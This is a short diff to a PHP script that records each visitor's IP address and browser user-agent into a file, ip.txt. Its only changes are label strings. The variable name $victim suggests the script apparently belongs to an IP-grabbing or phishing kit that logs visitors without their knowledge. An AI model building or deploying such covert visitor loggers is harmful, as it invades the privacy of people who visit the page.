@@ -12,12 +12,12 @@ else
     {
       $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
     }
-$useragent = "XTRA: ";
+$useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
 
 $file = 'ip.txt';
-$victim = "\nINFO: ";
+$victim = "\nIP: ";
 $fp = fopen($file, 'a');
 
 fwrite($fp, $victim);
